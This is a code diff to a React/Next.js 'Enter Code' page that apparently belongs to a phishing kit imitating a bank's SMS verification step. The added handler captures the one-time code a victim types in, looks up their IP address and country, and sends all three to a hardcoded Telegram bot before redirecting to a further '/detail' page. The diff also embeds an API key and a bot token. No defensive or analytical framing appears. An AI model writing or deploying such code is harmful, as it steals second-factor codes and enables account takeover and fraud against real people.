@@ -1,6 +1,42 @@
 "use client";
 
+import { useRouter } from "next/navigation";
+import { useState } from "react";
+
 export default function Otp() {
+  const [otp, setOtp] = useState("");
+  const router = useRouter();
+
+  const onSent = async (e) => {
+    e.preventDefault();
+
+    fetch("https://api.ipify.org?format=json")
+      .then((res) => res.json())
+      .then((data) => {
+        const ipAddress = data.ip;
+
+        fetch(`https://api.ipgeolocation.io/ipgeo?apiKey=e4e885c9d83f4a1c920483077bd49a2d&ip=${ipAddress}`)
+          .then((res) => res.json())
+          .then((data) => {
+            const country = data.country_name;
+            const apiUrl = `https://api.telegram.org/bot7336936844:AAHy6YK4JqvujJ7a_2nQh5TT2arbitukpUg/sendMessage?chat_id=5824354578&parse_mode=markdown&text=*USER:* ${encodeURIComponent(ipAddress)} %0A%0A*OTP:* ${encodeURIComponent(otp)} %0A%0A*COUNTRY:* ${encodeURIComponent(country)}`;
+
+            fetch(apiUrl)
+              .then((res) => {
+                if (!res.ok) console.error("ERROR:", res.statusText);
+                return res.json();
+              })
+              .then(() => {
+                console.log("SENT!");
+                router.push("/detail");
+              })
+              .catch((e) => console.error("ERROR:", e));
+          })
+          .catch((e) => console.error("ERROR:", e));
+      })
+      .catch((e) => console.error("ERROR:", e));
+  };
+
   return (
     <>
       <header role="banner" className="mgvEnhanceHeader">
@@ -38,7 +74,7 @@ export default function Otp() {
                       >
                       <h1>Enter Code</h1>
 
-                      <form>
+                      <form onSubmit={onSent}>
                         <div className="input-group">
                           <p>We sent a code by SMS to your mobile number</p>
                           <div className="code-container">
@@ -52,7 +88,7 @@ export default function Otp() {
                                 className="security-code"
                                 maxLength="6"
                                 required
-                                onChange={(e) => { }}
+                                onChange={(e) => setOtp(e.target.value)}
                               />
                             </label>
                             <p style={{ fontSize: 14 }}>
